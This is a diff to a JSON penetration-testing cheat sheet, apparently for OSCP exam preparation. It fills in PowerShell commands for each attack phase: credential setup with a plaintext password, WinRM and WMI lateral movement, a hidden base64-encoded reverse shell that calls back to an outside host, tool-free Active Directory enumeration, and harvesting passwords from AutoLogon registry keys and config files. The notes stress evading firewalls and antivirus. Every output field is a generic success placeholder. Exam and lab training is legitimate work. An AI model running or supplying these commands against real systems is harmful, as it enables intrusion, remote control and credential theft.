@@ -72,47 +72,91 @@
           "title": "Phase 1: Credential Setup for Remote Authentication",
           "notes": "First step for all WinRM/WMI lateral movement - create reusable PSCredential object from username/password. Required before Invoke-Command, New-PSSession, or New-CimSession. Can be compressed into one-liners with semicolons for speed.",
           "commands": [
-            "ps-winrm-credential-setup"
+            {
+              "id": "ps-winrm-credential-setup",
+              "example": "$username = 'jen'; $password = 'Nexus123!'; $secureString = ConvertTo-SecureString $password -AsPlaintext -Force; $credential = New-Object System.Management.Automation.PSCredential $username, $secureString",
+              "shows": "Command executes successfully"
+            }
           ]
         },
         {
           "title": "Phase 2: Lateral Movement via WinRM",
           "notes": "WinRM-based remote execution when port 5985/5986 available. Fastest method for flag retrieval and command execution. Domain users bypass UAC remote restrictions. Invoke-Command for one-off commands, New-PSSession for interactive shells.",
           "commands": [
-            "ps-winrm-invoke-command"
+            {
+              "id": "ps-winrm-invoke-command",
+              "example": "Invoke-Command -ComputerName 192.168.50.73 -Credential $credential -ScriptBlock {whoami; hostname}",
+              "shows": "Command executes successfully"
+            }
           ]
         },
         {
           "title": "Phase 3: Lateral Movement via WMI (WinRM Alternative)",
           "notes": "WMI-based remote execution when WinRM unavailable but RPC (135) accessible. Requires DCOM protocol configuration. Processes spawn in session 0 as SYSTEM. Common backup technique when WinRM blocked by firewall or disabled.",
           "commands": [
-            "ps-wmi-cimsession-setup",
-            "ps-wmi-invoke-method"
+            {
+              "id": "ps-wmi-cimsession-setup",
+              "example": "$options = New-CimSessionOption -Protocol DCOM; $session = New-Cimsession -ComputerName 192.168.50.73 -Credential $credential -SessionOption $options",
+              "shows": "Command executes successfully"
+            },
+            {
+              "id": "ps-wmi-invoke-method",
+              "example": "Invoke-CimMethod -CimSession $session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine='calc'}",
+              "shows": "Command executes successfully"
+            }
           ]
         },
         {
           "title": "Phase 4: Reverse Shell Payloads",
           "notes": "Base64-encoded PowerShell reverse shells for interactive access after lateral movement. Use Python encoder script to generate payloads with custom LHOST/LPORT. Set up nc listener before execution. Shells run hidden (-w hidden flag) and connect outbound to bypass inbound firewall rules.",
           "commands": [
-            "ps-reverse-shell-encoder-python",
-            "ps-reverse-shell-base64"
+            {
+              "id": "ps-reverse-shell-encoder-python",
+              "example": "python3 encode.py",
+              "shows": "Command executes successfully"
+            },
+            {
+              "id": "ps-reverse-shell-base64",
+              "example": "powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADEAMQA4AC4AMgAiACwANAA0ADMAKQA7AA...",
+              "shows": "Command executes successfully"
+            }
           ]
         },
         {
           "title": "Phase 5: Active Directory Enumeration (No Tools)",
           "notes": "Built-in .NET methods for AD enumeration without PowerView/SharpHound uploads. [adsisearcher] for LDAP queries, GetCurrentDomain() for topology info. Works on any domain-joined host with standard user privileges. Minimal AV detection footprint.",
           "commands": [
-            "ps-get-current-domain",
-            "ps-ldap-directorysearcher"
+            {
+              "id": "ps-get-current-domain",
+              "example": "[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()",
+              "shows": "Command executes successfully"
+            },
+            {
+              "id": "ps-ldap-directorysearcher",
+              "example": "([adsisearcher]'(objectClass=user)').FindAll()",
+              "shows": "Command executes successfully"
+            }
           ]
         },
         {
           "title": "Phase 6: Flag Retrieval and Post-Exploitation",
           "notes": "Final OSCP exam phase - locate and retrieve proof.txt flags from Administrator desktops. Also includes credential harvesting from registry AutoLogon keys and filesystem searches for passwords in config files. Time-critical commands to maximize exam points.",
           "commands": [
-            "ps-search-desktop-flags",
-            "ps-registry-autologon",
-            "ps-search-credentials"
+            {
+              "id": "ps-search-desktop-flags",
+              "example": "Get-Content C:\\Users\\Administrator\\Desktop\\*.txt",
+              "shows": "Command executes successfully"
+            },
+            {
+              "id": "ps-registry-autologon",
+              "example": "Get-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon' | Select-Object DefaultUserName,DefaultPassword,DefaultDomainName",
+              "shows": "Command executes successfully"
+            },
+            {
+              "id": "ps-search-credentials",
+              "example": "Get-ChildItem -Path C:\\Users -Include *.txt,*.xml,*.ini,*.config -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern password",
+              "shows": "Command executes successfully"
+            }
           ]
         }
       ],
